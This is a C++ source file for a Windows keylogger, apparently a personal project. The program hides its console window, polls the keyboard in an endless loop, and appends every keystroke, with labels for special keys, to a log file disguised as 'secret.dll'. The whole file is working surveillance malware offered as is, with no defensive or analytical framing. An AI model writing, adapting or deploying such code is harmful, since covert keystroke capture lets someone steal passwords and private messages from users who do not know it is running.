
// keylogger.cpp
// 
// Programmer  : sagi.v
// Date : 11 / 08 / 2023
//
//  The code log keystrokes into a file
//------------------------------------------

#define _CRT_SECURE_NO_DEPRECATE
#define _WIN32_WINNT 0x0500
#define PRESSED -32767

// File path
#define PATH "secret.dll"

#include <Windows.h>
#include <stdio.h>
#include <fstream>

using namespace std;

// Log Special Characters into the file 
void LOG(string input) {
	fstream LogFile;
	LogFile.open(PATH, fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int Key) {
	switch (Key) {
	case VK_SPACE:
		LOG(" ");
		return true;

	case VK_RETURN:
		LOG("\n");
		return true;

	case VK_OEM_PERIOD:
		LOG(".");
		return true;

	case VK_OEM_COMMA:
		LOG(",");
		return true;

	case VK_SHIFT:
		LOG("#SHIFT#");
		return true;

	case VK_BACK:
		LOG("#BACKSPACE#");
		return true;

	case VK_CAPITAL:
		LOG("#CAPS_LCOK#");
		return true;

	case VK_TAB:
		LOG("#TAB#");
		return true;

	case VK_UP:
		LOG("#UP_ARROW_KEY#");
		return true;

	case VK_DOWN:
		LOG("#DOWN_ARROW_KEY#");
		return true;

	case VK_LEFT:
		LOG("#LEFT_ARROW_KEY#");
		return true;

	case VK_RIGHT:
		LOG("#RIGHT_ARROW_KEY#");
		return true;

	case VK_CONTROL:
		LOG("#CONTROL#");
		return true;

	case VK_MENU:
		LOG("#ALT#");
		return true;

	case VK_DELETE:
		LOG("#DELETE#");
		return true;

	case VK_HOME:
		LOG("#HOME#");
		return true;

	default:
		return false;
	}
}


int main()
{
	// Running the application in the background
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true) {
		Sleep(15);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			// Checking if the key is pressed
			if (GetAsyncKeyState(KEY) == PRESSED) {

				// Checking if the key is a Special Key and Log it Accordingly
				if (SpecialKeys(KEY) == false) {

					// Log the key
					fstream LogFile;
					LogFile.open(PATH, fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}


	return 0;
}
